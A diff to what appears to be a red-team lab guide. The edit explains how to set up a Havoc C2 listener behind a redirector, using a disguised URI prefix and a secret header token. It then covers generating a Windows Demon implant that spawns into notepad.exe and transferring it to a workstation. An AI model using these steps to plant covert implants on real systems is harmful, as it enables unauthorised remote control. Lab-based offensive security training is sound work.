@@ -924,18 +924,57 @@ havoc-client client
 
 ### Step 6.3: Create Listener and Generate Demon
 
-**In the Havoc client:**
+Get your token value before starting:
+
+```bash
+terraform output deployment_info
+# Look for: C2 Header: X-Request-ID: <token>
+```
+
+**Create the listener in the Havoc client:**
 
 1. Navigate to: **View → Listeners → Add**
-2. Set protocol to **HTTP**, bind port **80**, host **0.0.0.0**
-3. No URI prefix or header config needed in the listener — the redirector strips the prefix before forwarding
+2. Configure the following fields:
+
+| Field | Value |
+| ----- | ----- |
+| Payload | Http |
+| **Hosts** | `<YOUR_REDIRECTOR_DOMAIN>` — click **Add** |
+| Host (Bind) | `0.0.0.0` |
+| PortBind | `80` |
+| **PortConn** | `80` |
+| **Uris** | `/edge/cache/assets/update` — click **Add** (add more if desired, all must start with `/edge/cache/assets/`) |
+| **Headers** | `X-Request-ID: <token>` — click **Add** (no quotes around token) |
+
+> The **Hosts** field is the callback address baked into the demon. The **Uris** and **Headers** are embedded in the demon so it sends them on every check-in. The redirector validates the URI prefix and header, strips the prefix, then forwards plain HTTP to Havoc on port 80.
+
+1. Click **Save**
 
 **Generate a Demon (Havoc implant):**
 
 1. Navigate to: **Attack → Payloads**
-2. Set the callback host to `https://<YOUR_REDIRECTOR_DOMAIN>` and set the URI path to `/edge/cache/assets/` (this is where the URI prefix goes — in the Demon callback config, not the listener)
-3. In the Demon's HTTP profile/headers section, add a custom header: `X-Request-ID: <token from terraform output deployment_info>`
-4. Generate and transfer the `.exe` to the Windows workstation
+2. Select the listener you just created, set Arch **x64**, Format **Windows Exe**
+3. Fill in the **Injection** section — Spawn64 and Spawn32 are required (leave blank = build error):
+   - **Spawn64:** `C:\Windows\System32\notepad.exe`
+   - **Spawn32:** `C:\Windows\SysWOW64\notepad.exe`
+4. Click **Generate** — the `.exe` is saved to `/home/admin/Desktop/demon.x64.exe`
+
+**Transfer the demon to the Windows workstation:**
+
+From the Windows machine (via Guacamole RDP or MobaXterm), pull the file from the Havoc server:
+
+```powershell
+scp admin@havoc:/home/admin/Desktop/demon.x64.exe C:\Users\Administrator\Desktop\
+```
+
+Then zip and download via Guacamole drive share:
+
+```powershell
+Compress-Archive -Path C:\Users\Administrator\Desktop\demon.x64.exe -DestinationPath C:\Users\Administrator\Desktop\demon.zip
+Copy-Item C:\Users\Administrator\Desktop\demon.zip C:\guacshare\
+```
+
+> Open the Guacamole sidebar (`Ctrl+Alt+Shift`), click the **Drive** section, and download `demon.zip` to your local machine.
 
 **Checkpoint:** ✅ Havoc Demon calling back through redirector URI prefix /edge/cache/assets/
 
